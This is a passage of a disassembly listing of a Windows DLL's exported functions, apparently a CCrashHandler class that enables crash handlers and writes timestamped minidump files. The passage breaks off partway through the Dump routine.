		push	[esp+4+arg_4]
		mov	ecx, esi
		push	dword ptr [esp+8+Args]
		call	Ordinal1026
		pop	esi
		retn	8
Ordinal559	endp

; Exported entry 563.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal563
Ordinal563	proc near		; CODE XREF: Ordinal561+9p
					; Ordinal562+39p ...

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		lea	ecx, [esi+4]
		call	Ordinal909
		lea	ecx, [esi+2Ch]
		call	Ordinal985
		lea	ecx, [esi+1Ch]
		call	Ordinal748
		lea	ecx, [esi+3Ch]
		call	Ordinal1025
		lea	ecx, [esi+70h]
		call	Ordinal1064
		and	dword ptr [esi+4Ch], 0
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	esi
		leave
		retn
Ordinal563	endp

; Exported entry 565.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal565
Ordinal565	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	esi, [esi+4Ch]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal565	endp

; Exported entry 566.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal566
Ordinal566	proc near		; CODE XREF: Ordinal148+37p
					; Ordinal148+59p ...

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	eax, [ebp+arg_0]
		dec	eax
		dec	eax
		jz	short loc_6AF3F89F
		dec	eax
		jz	short loc_6AF3F897
		dec	eax
		jz	short loc_6AF3F88F
		dec	eax
		jnz	short loc_6AF3F8A5
		mov	eax, [ebp+arg_4]
		mov	[esi+68h], eax
		jmp	short loc_6AF3F8A5
; ---------------------------------------------------------------------------

loc_6AF3F88F:				; CODE XREF: Ordinal566+23j
		mov	eax, [ebp+arg_4]
		mov	[esi+60h], eax
		jmp	short loc_6AF3F8A5
; ---------------------------------------------------------------------------

loc_6AF3F897:				; CODE XREF: Ordinal566+20j
		mov	eax, [ebp+arg_4]
		mov	[esi+58h], eax
		jmp	short loc_6AF3F8A5
; ---------------------------------------------------------------------------

loc_6AF3F89F:				; CODE XREF: Ordinal566+1Dj
		mov	eax, [ebp+arg_4]
		mov	[esi+50h], eax

loc_6AF3F8A5:				; CODE XREF: Ordinal566+26j
					; Ordinal566+2Ej ...
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	esi
		leave
		retn	8
Ordinal566	endp

; Exported entry 567.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal567
Ordinal567	proc near		; CODE XREF: Ordinal564+3Cp
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	edi
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	eax, [ebp+arg_0]
		xor	edi, edi
		dec	eax
		jz	short loc_6AF3F8F3
		dec	eax
		jz	short loc_6AF3F8EE
		dec	eax
		jz	short loc_6AF3F8E9
		dec	eax
		jz	short loc_6AF3F8E4
		dec	eax
		jnz	short loc_6AF3F8F6
		mov	edi, [esi+68h]
		jmp	short loc_6AF3F8F6
; ---------------------------------------------------------------------------

loc_6AF3F8E4:				; CODE XREF: Ordinal567+28j
		mov	edi, [esi+60h]
		jmp	short loc_6AF3F8F6
; ---------------------------------------------------------------------------

loc_6AF3F8E9:				; CODE XREF: Ordinal567+25j
		mov	edi, [esi+58h]
		jmp	short loc_6AF3F8F6
; ---------------------------------------------------------------------------

loc_6AF3F8EE:				; CODE XREF: Ordinal567+22j
		mov	edi, [esi+50h]
		jmp	short loc_6AF3F8F6
; ---------------------------------------------------------------------------

loc_6AF3F8F3:				; CODE XREF: Ordinal567+1Fj
		xor	edi, edi
		inc	edi

loc_6AF3F8F6:				; CODE XREF: Ordinal567+2Bj
					; Ordinal567+30j ...
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, edi
		pop	edi
		pop	esi
		leave
		retn	4
Ordinal567	endp

; Exported entry 568.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal568
Ordinal568	proc near		; CODE XREF: Ordinal148+43p
					; Ordinal148+65p ...

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	eax, [ebp+arg_0]
		dec	eax
		dec	eax
		jz	short loc_6AF3F946
		dec	eax
		jz	short loc_6AF3F93E
		dec	eax
		jz	short loc_6AF3F936
		dec	eax
		jnz	short loc_6AF3F94C
		mov	eax, [ebp+arg_4]
		mov	[esi+6Ch], eax
		jmp	short loc_6AF3F94C
; ---------------------------------------------------------------------------

loc_6AF3F936:				; CODE XREF: Ordinal568+23j
		mov	eax, [ebp+arg_4]
		mov	[esi+64h], eax
		jmp	short loc_6AF3F94C
; ---------------------------------------------------------------------------

loc_6AF3F93E:				; CODE XREF: Ordinal568+20j
		mov	eax, [ebp+arg_4]
		mov	[esi+5Ch], eax
		jmp	short loc_6AF3F94C
; ---------------------------------------------------------------------------

loc_6AF3F946:				; CODE XREF: Ordinal568+1Dj
		mov	eax, [ebp+arg_4]
		mov	[esi+54h], eax

loc_6AF3F94C:				; CODE XREF: Ordinal568+26j
					; Ordinal568+2Ej ...
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	esi
		leave
		retn	8
Ordinal568	endp

; Exported entry 569.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal569
Ordinal569	proc near		; CODE XREF: Ordinal564+269p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	edi
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	eax, [ebp+arg_0]
		xor	edi, edi
		dec	eax
		jz	short loc_6AF3F99A
		dec	eax
		jz	short loc_6AF3F995
		dec	eax
		jz	short loc_6AF3F990
		dec	eax
		jz	short loc_6AF3F98B
		dec	eax
		jnz	short loc_6AF3F99C
		mov	edi, [esi+6Ch]
		jmp	short loc_6AF3F99C
; ---------------------------------------------------------------------------

loc_6AF3F98B:				; CODE XREF: Ordinal569+28j
		mov	edi, [esi+64h]
		jmp	short loc_6AF3F99C
; ---------------------------------------------------------------------------

loc_6AF3F990:				; CODE XREF: Ordinal569+25j
		mov	edi, [esi+5Ch]
		jmp	short loc_6AF3F99C
; ---------------------------------------------------------------------------

loc_6AF3F995:				; CODE XREF: Ordinal569+22j
		mov	edi, [esi+54h]
		jmp	short loc_6AF3F99C
; ---------------------------------------------------------------------------

loc_6AF3F99A:				; CODE XREF: Ordinal569+1Fj
		xor	edi, edi

loc_6AF3F99C:				; CODE XREF: Ordinal569+2Bj
					; Ordinal569+30j ...
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, edi
		pop	edi
		pop	esi
		leave
		retn	4
Ordinal569	endp

; Exported entry 570.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal570
Ordinal570	proc near		; CODE XREF: Ordinal148+4Dp
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		push	[ebp+arg_0]
		lea	ecx, [esi+4]
		call	Ordinal912
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	esi
		leave
		retn	4
Ordinal570	endp

; Exported entry 571.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal571
Ordinal571	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		lea	ecx, [esi+4]
		call	Ordinal865
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal571	endp

; Exported entry 574.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal574
Ordinal574	proc near		; CODE XREF: Ordinal148+9Fp
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	eax, [ebp+arg_0]
		lea	ecx, [ebp+var_C]
		mov	[esi+84h], eax
		call	Ordinal1230
		pop	esi
		leave
		retn	4
Ordinal574	endp

; Exported entry 575.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal575
Ordinal575	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	esi, [esi+84h]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal575	endp

; Exported entry 576.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal576
Ordinal576	proc near		; CODE XREF: Ordinal148+A9p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	eax, [ebp+arg_0]
		lea	ecx, [ebp+var_C]
		mov	[esi+88h], eax
		call	Ordinal1230
		pop	esi
		leave
		retn	4
Ordinal576	endp

; Exported entry 577.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal577
Ordinal577	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	esi, [esi+88h]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal577	endp

; Exported entry 578.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal578
Ordinal578	proc near		; CODE XREF: Ordinal148+B3p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	eax, [ebp+arg_0]
		lea	ecx, [ebp+var_C]
		mov	[esi+8Ch], eax
		call	Ordinal1230
		pop	esi
		leave
		retn	4
Ordinal578	endp

; Exported entry 579.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal579
Ordinal579	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	esi, [esi+8Ch]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal579	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3FB16(void *, char)
sub_6AF3FB16	proc near		; DATA XREF: .rdata:off_6AF5A1FCo

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal549
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3FB2C
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3FB2C:				; CODE XREF: sub_6AF3FB16+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3FB16	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3FB32(void *, char)
sub_6AF3FB32	proc near		; DATA XREF: .rdata:off_6AF5A234o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal552
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3FB48
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3FB48:				; CODE XREF: sub_6AF3FB32+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3FB32	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3FB4E(void *, char)
sub_6AF3FB4E	proc near		; DATA XREF: .rdata:off_6AF5A284o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal555
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3FB64
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3FB64:				; CODE XREF: sub_6AF3FB4E+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3FB4E	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3FB6A(void *, char)
sub_6AF3FB6A	proc near		; DATA XREF: .rdata:off_6AF5A2B8o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal558
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3FB80
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3FB80:				; CODE XREF: sub_6AF3FB6A+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3FB6A	endp

; Exported entry 573.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal573
Ordinal573	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	esi, [esi+7Ch]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal573	endp

; Exported entry 561.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal561
Ordinal561	proc near		; CODE XREF: Ordinal134+6j
					; sub_6AF3FC92+3p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5A2F8
		call	Ordinal563
		lea	ecx, [esi+90h]
		call	Ordinal1279
		lea	ecx, [esi+80h]
		call	sub_6AF3789B
		lea	ecx, [esi+7Ch]
		call	sub_6AF3789B
		lea	ecx, [esi+70h]
		call	Ordinal627
		lea	ecx, [esi+3Ch]
		call	Ordinal558
		lea	ecx, [esi+2Ch]
		call	Ordinal555
		lea	ecx, [esi+1Ch]
		call	Ordinal552
		lea	ecx, [esi+4]
		pop	esi
		jmp	Ordinal549
Ordinal561	endp

; Exported entry 560.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal560
Ordinal560	proc near		; CODE XREF: Ordinal133+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		push	edi
		push	esi
		lea	ecx, [esi+4]
		mov	dword ptr [esi], offset	off_6AF5A2F8
		call	Ordinal548
		push	esi
		lea	ecx, [esi+1Ch]
		call	Ordinal551
		push	esi
		lea	ecx, [esi+2Ch]
		call	Ordinal554
		push	esi
		lea	ecx, [esi+3Ch]
		call	Ordinal557
		xor	eax, eax
		xor	edi, edi
		inc	edi
		lea	ecx, [esi+70h]
		mov	[esi+4Ch], eax
		mov	[esi+50h], edi
		mov	[esi+54h], eax
		mov	[esi+58h], edi
		mov	[esi+5Ch], eax
		mov	[esi+60h], edi
		mov	[esi+64h], eax
		mov	[esi+68h], edi
		mov	[esi+6Ch], eax
		call	Ordinal626
		lea	ecx, [esi+7Ch]
		call	sub_6AF318C3
		lea	ecx, [esi+80h]
		call	sub_6AF318C3
		lea	ecx, [esi+90h]
		mov	[esi+84h], edi
		mov	[esi+88h], edi
		mov	dword ptr [esi+8Ch], 22h
		call	Ordinal1278
		pop	edi
		mov	eax, esi
		pop	esi
		retn
Ordinal560	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3FC92(void *, char)
sub_6AF3FC92	proc near		; DATA XREF: .rdata:off_6AF5A2F8o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal561
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3FCA8
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3FCA8:				; CODE XREF: sub_6AF3FC92+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3FC92	endp

; Exported entry 562.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal562
Ordinal562	proc near		; CODE XREF: Ordinal135+53p
					; DATA XREF: .rdata:off_6AF66098o

var_168		= byte ptr -168h
var_A0		= byte ptr -0A0h
var_5C		= byte ptr -5Ch
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_70 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 15Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		mov	[ebp+var_14], eax
		lea	eax, [esi+90h]
		mov	[ebp+var_10], esp
		push	eax
		lea	ecx, [ebp+var_5C]
		mov	[ebp+var_28], esi
		call	Ordinal1229
		xor	ebx, ebx
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal563
		lea	ecx, [esi+70h]
		call	Ordinal632
		test	eax, eax
		jnz	short loc_6AF3FD03
		push	offset aCcrashhandlerE ; "CCrashHandler::Enable() : m_DebugHelp.C"...
		call	sub_6AF3101A
		pop	ecx

loc_6AF3FD03:				; CODE XREF: Ordinal562+48j
		lea	ecx, [ebp+var_A0]
		call	Ordinal1163
		push	ebx		; Args
		lea	ecx, [ebp+var_A0]
		mov	byte ptr [ebp+var_4], 1
		call	Ordinal1165
		test	eax, eax
		jnz	short loc_6AF3FD34
		push	offset aCcrashhandle_2 ; "CCrashHandler::Enable() : path.SplitPat"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	loc_6AF3FEEF
; ---------------------------------------------------------------------------

loc_6AF3FD34:				; CODE XREF: Ordinal562+72j
		push	offset aCcrashhandle_3 ; "CCrashHandler::Enable()"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		lea	edi, [esi+7Ch]
		mov	eax, [edi]
		cmp	[eax-0Ch], ebx
		mov	byte ptr [ebp+var_4], 3
		jnz	short loc_6AF3FD75
		lea	ecx, [ebp+var_A0]
		call	Ordinal1171
		push	eax
		lea	ecx, [ebp+var_A0]
		call	Ordinal766
		push	eax		; Args
		push	offset aSS_dmp	; "%s%s.dmp"
		push	edi		; int
		call	sub_6AF3217C
		add	esp, 10h

loc_6AF3FD75:				; CODE XREF: Ordinal562+9Fj
		lea	ecx, [ebp+var_168]
		call	Ordinal1523
		lea	ecx, [ebp+var_A0]
		mov	byte ptr [ebp+var_4], 4
		call	Ordinal1118
		push	eax		; Filename
		lea	ecx, [ebp+var_168]
		call	Ordinal1525
		test	eax, eax
		jnz	short loc_6AF3FDAC
		push	offset aCcrashhandle_4 ; "CCrashHandler::Enable() : versionInfo.L"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF3FDC3
; ---------------------------------------------------------------------------

loc_6AF3FDAC:				; CODE XREF: Ordinal562+EFj
		lea	ecx, [ebp+var_168]
		call	Ordinal1530
		lea	ecx, [esi+80h]
		push	eax		; Src
		call	sub_6AF31B1D

loc_6AF3FDC3:				; CODE XREF: Ordinal562+FCj
		lea	ecx, [ebp+var_168]
		call	Ordinal1524
		jmp	loc_6AF3FE6E
; ---------------------------------------------------------------------------

loc_6AF3FDD3:				; DATA XREF: .rdata:6AF630B0o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3FE6B
		retn
; ---------------------------------------------------------------------------

loc_6AF3FE16:				; DATA XREF: .rdata:6AF630C0o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3FE6B
		retn
; ---------------------------------------------------------------------------

loc_6AF3FE6B:				; DATA XREF: Ordinal562+162o
					; Ordinal562+1B7o
		mov	esi, [ebp+var_28]

loc_6AF3FE6E:				; CODE XREF: Ordinal562+120j
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF3FE7E
		xor	esi, esi
		jmp	short loc_6AF3FEE7
; ---------------------------------------------------------------------------

loc_6AF3FE7E:				; CODE XREF: Ordinal562+1CAj
		lea	ecx, [esi+4]
		call	Ordinal908
		test	eax, eax
		jnz	short loc_6AF3FE91
		push	offset aCcrashhandle_5 ; "CCrashHandler::Enable() : m_NewHandler."...
		jmp	short loc_6AF3FEC8
; ---------------------------------------------------------------------------

loc_6AF3FE91:				; CODE XREF: Ordinal562+1DAj
		lea	ecx, [esi+2Ch]
		call	Ordinal984
		test	eax, eax
		jnz	short loc_6AF3FEA4
		push	offset aCcrashhandle_6 ; "CCrashHandler::Enable() : m_PurecallHan"...
		jmp	short loc_6AF3FEC8
; ---------------------------------------------------------------------------

loc_6AF3FEA4:				; CODE XREF: Ordinal562+1EDj
		lea	ecx, [esi+1Ch]
		call	Ordinal747
		test	eax, eax
		jnz	short loc_6AF3FEB7
		push	offset aCcrashhandle_7 ; "CCrashHandler::Enable() : m_ExceptionHa"...
		jmp	short loc_6AF3FEC8
; ---------------------------------------------------------------------------

loc_6AF3FEB7:				; CODE XREF: Ordinal562+200j
		lea	ecx, [esi+3Ch]
		call	Ordinal1024
		test	eax, eax
		jnz	short loc_6AF3FED0
		push	offset aCcrashhandle_8 ; "CCrashHandler::Enable() : m_SecurityHan"...

loc_6AF3FEC8:				; CODE XREF: Ordinal562+1E1j
					; Ordinal562+1F4j ...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3FED7
; ---------------------------------------------------------------------------

loc_6AF3FED0:				; CODE XREF: Ordinal562+213j
		mov	dword ptr [esi+4Ch], 1

loc_6AF3FED7:				; CODE XREF: Ordinal562+220j
		cmp	dword ptr [esi+4Ch], 0
		jnz	short loc_6AF3FEE4
		mov	ecx, esi
		call	Ordinal563

loc_6AF3FEE4:				; CODE XREF: Ordinal562+22Dj
		mov	esi, [esi+4Ch]

loc_6AF3FEE7:				; CODE XREF: Ordinal562+1CEj
		lea	ecx, [ebp+var_48]
		call	Ordinal752

loc_6AF3FEEF:				; CODE XREF: Ordinal562+81j
		lea	ecx, [ebp+var_A0]
		call	Ordinal1164
		lea	ecx, [ebp+var_5C]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal562	endp ; sp-analysis failed

; Exported entry 564.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal564(char	Args, int)
		public Ordinal564
Ordinal564	proc near		; DATA XREF: .rdata:6AF545ACo
					; .rdata:6AF5A2FCo ...

var_A8		= byte ptr -0A8h
var_64		= dword	ptr -64h
var_60		= byte ptr -60h
var_54		= dword	ptr -54h
var_50		= byte ptr -50h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
SystemTime	= _SYSTEMTIME ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Args		= byte ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_71 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 9Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		mov	[ebp+var_14], eax
		lea	eax, [esi+90h]
		mov	[ebp+var_10], esp
		push	eax
		lea	ecx, [ebp+var_60]
		mov	[ebp+var_30], esi
		call	Ordinal1229
		push	dword ptr [ebp+Args]
		xor	edi, edi
		mov	ecx, esi
		mov	[ebp+var_4], edi
		call	Ordinal567
		test	eax, eax
		jz	loc_6AF401A7
		push	[ebp+arg_4]
		push	dword ptr [ebp+Args] ; Args
		push	offset aCcrashhandlerD ; "CCrashHandler::Dump()	: eCrashType = %l"...
		call	sub_6AF3102E
		add	esp, 0Ch
		lea	ecx, [ebp+var_28]
		call	sub_6AF318C3
		cmp	[esi+84h], edi
		mov	eax, [esi+7Ch]
		mov	byte ptr [ebp+var_4], 1
		mov	[ebp+var_2C], eax
		jnz	short loc_6AF3FF9D
		cmp	[esi+88h], edi
		jz	loc_6AF4013E

loc_6AF3FF9D:				; CODE XREF: Ordinal564+74j
		push	offset aCcrashhandle_9 ; "CCrashHandler::Dump()"
		lea	ecx, [ebp+var_50]
		call	Ordinal751
		lea	ecx, [ebp+var_A8]
		call	Ordinal1163
		push	dword ptr [esi+7Ch] ; Args
		lea	ecx, [ebp+var_A8]
		mov	byte ptr [ebp+var_4], 4
		call	Ordinal1165
		test	eax, eax
		jnz	short loc_6AF3FFDB
		push	offset aCcrashhandl_10 ; "CCrashHandler::Dump()	: path.SplitPath("...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF40089
; ---------------------------------------------------------------------------

loc_6AF3FFDB:				; CODE XREF: Ordinal564+AEj
		lea	ecx, [ebp+var_A8]
		call	Ordinal1171
		push	eax
		lea	ecx, [ebp+var_A8]
		call	Ordinal766
		push	eax		; Args
		lea	eax, [ebp+var_28]
		push	offset aSS_0	; "%s%s"
		push	eax		; int
		call	sub_6AF3217C
		add	esp, 10h
		cmp	[esi+88h], edi
		jz	short loc_6AF40029
		mov	eax, [esi+80h]
		cmp	[eax-0Ch], edi
		jz	short loc_6AF40029
		push	eax		; Args
		lea	eax, [ebp+var_28]
		push	offset aS_1	; "-%s"
		push	eax		; int
		call	sub_6AF3218F
		add	esp, 0Ch

loc_6AF40029:				; CODE XREF: Ordinal564+EFj
					; Ordinal564+FAj
		cmp	[esi+84h], edi
		jz	short loc_6AF4006F
		lea	eax, [ebp+SystemTime]
		push	eax		; lpSystemTime
		call	ds:GetLocalTime
		movzx	eax, [ebp+SystemTime.wMilliseconds]
		push	eax
		movzx	eax, [ebp+SystemTime.wSecond]
		push	eax
		movzx	eax, [ebp+SystemTime.wMinute]
		push	eax
		movzx	eax, [ebp+SystemTime.wHour]
		push	eax
		movzx	eax, [ebp+SystemTime.wDay]
		push	eax
		movzx	eax, [ebp+SystemTime.wMonth]
		push	eax
		movzx	eax, [ebp+SystemTime.wYear]
		push	eax		; Args
		lea	eax, [ebp+var_28]
		push	offset a04d02d02d02d02 ; "-%04d-%02d-%02d-%02d-%02d-%02d-%03d"
		push	eax		; int
		call	sub_6AF3218F
		add	esp, 24h

